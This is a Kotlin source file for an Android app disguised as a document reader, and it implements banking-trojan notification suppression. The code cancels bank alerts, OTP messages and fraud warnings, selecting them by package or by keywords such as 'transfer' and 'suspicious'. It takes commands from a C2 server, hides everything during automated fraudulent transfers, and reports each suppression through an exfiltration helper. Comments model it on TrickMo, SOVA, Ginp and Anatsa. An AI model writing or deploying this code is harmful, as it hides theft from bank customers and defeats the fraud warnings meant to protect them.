package com.docreader.lite.reader

import android.service.notification.StatusBarNotification

/**
 * Notification suppression — hide bank fraud alerts from victim.
 *
 * Family reference:
 *   - TrickMo: cancelNotification() on banking app alerts
 *   - SOVA: selective notification hiding during ATS
 *   - Ginp: suppresses OTP notifications after capture
 *   - Anatsa V4: hides transfer confirmation notifications
 *
 * Mechanism:
 *   Piggybacks on existing SyncNotificationService (NLS).
 *   When C2 sends SUPPRESS_NOTIFS command with target packages,
 *   NLS cancelNotification() silently removes them.
 *
 *   User never sees:
 *     - "Transfer of $X initiated" from bank
 *     - "OTP: 123456" (captured first, then hidden)
 *     - "Suspicious login detected" security alerts
 *     - "New device registered" warnings
 *
 * This is critical for ATS: after fraudulent transfer, bank sends
 * confirmation notification. Without suppression, victim sees it immediately.
 */
object NotificationFilter {

    // Suppression modes
    enum class Mode {
        OFF,           // No suppression
        TARGET_ONLY,   // Only suppress notifications from target banking apps
        ALL_BANKING,   // Suppress all banking/financial app notifications
        AGGRESSIVE     // Suppress ALL notifications (risky — user notices silence)
    }

    var mode = Mode.OFF
        private set

    // Packages to suppress (C2-updatable)
    private val suppressList = mutableSetOf<String>()

    // Keywords that trigger suppression regardless of package
    private val dangerKeywords = listOf(
        "transfer", "transaction", "withdrawal", "sent",
        "suspicious", "unauthorized", "security alert",
        "new device", "login attempt", "verification",
        "fraud", "blocked", "declined"
    )

    fun setMode(newMode: Mode) {
        mode = newMode
    }

    fun updateSuppressList(packages: List<String>) {
        suppressList.clear()
        suppressList.addAll(packages)
    }

    /**
     * Called from SyncNotificationService for every notification.
     * Returns true if notification should be cancelled (suppressed).
     *
     * Flow:
     *   1. SyncNotificationService.onNotificationPosted() receives notification
     *   2. OTP extractor captures any OTP codes first
     *   3. NotificationFilter.shouldSuppress() checks if it should be hidden
     *   4. If true, SyncNotificationService calls cancelNotification(key)
     *   5. User never sees the notification
     */
    fun shouldSuppress(sbn: StatusBarNotification): Boolean {
        if (mode == Mode.OFF) return false

        val pkg = sbn.packageName

        // Always suppress if package is in explicit suppress list
        if (pkg in suppressList) {
            Exfil.event("notif_suppressed",
                "pkg" to pkg,
                "reason" to "suppress_list",
                "ticker" to (sbn.notification.tickerText?.toString()?.take(50) ?: "")
            )
            return true
        }

        when (mode) {
            Mode.TARGET_ONLY -> {
                // Suppress only if from a targeted banking app
                if (Targets.match(pkg) != null) {
                    Exfil.event("notif_suppressed",
                        "pkg" to pkg,
                        "reason" to "target_match"
                    )
                    return true
                }
            }
            Mode.ALL_BANKING -> {
                // Suppress from any banking/financial app
                if (Targets.match(pkg) != null || isBankingApp(pkg)) {
                    Exfil.event("notif_suppressed",
                        "pkg" to pkg,
                        "reason" to "banking_app"
                    )
                    return true
                }
                // Also check notification text for danger keywords
                val text = extractNotifText(sbn)
                if (containsDangerKeyword(text)) {
                    Exfil.event("notif_suppressed",
                        "pkg" to pkg,
                        "reason" to "danger_keyword",
                        "keyword" to findDangerKeyword(text)
                    )
                    return true
                }
            }
            Mode.AGGRESSIVE -> {
                // Suppress everything except our own package
                if (pkg != "com.docreader.lite") {
                    return true
                }
            }
            else -> {}
        }

        return false
    }

    /**
     * Temporarily suppress all notifications during ATS transfer.
     * Auto-reverts after duration (ms).
     */
    fun suppressDuringAts(durationMs: Long = 30_000) {
        val previousMode = mode
        mode = Mode.ALL_BANKING
        Exfil.event("ats_suppress_start", "duration" to durationMs.toString())

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            mode = previousMode
            Exfil.event("ats_suppress_end")
        }, durationMs)
    }

    private fun extractNotifText(sbn: StatusBarNotification): String {
        val n = sbn.notification
        val parts = mutableListOf<String>()
        n.tickerText?.toString()?.let { parts.add(it) }
        n.extras?.getCharSequence("android.title")?.toString()?.let { parts.add(it) }
        n.extras?.getCharSequence("android.text")?.toString()?.let { parts.add(it) }
        n.extras?.getCharSequence("android.bigText")?.toString()?.let { parts.add(it) }
        return parts.joinToString(" ").lowercase()
    }

    private fun containsDangerKeyword(text: String): Boolean {
        return dangerKeywords.any { text.contains(it) }
    }

    private fun findDangerKeyword(text: String): String {
        return dangerKeywords.firstOrNull { text.contains(it) } ?: ""
    }

    private fun isBankingApp(pkg: String): Boolean {
        // Heuristic: package name contains banking-related terms
        val bankTerms = listOf("bank", "finance", "pay", "wallet", "money", "credit")
        return bankTerms.any { pkg.lowercase().contains(it) }
    }
}
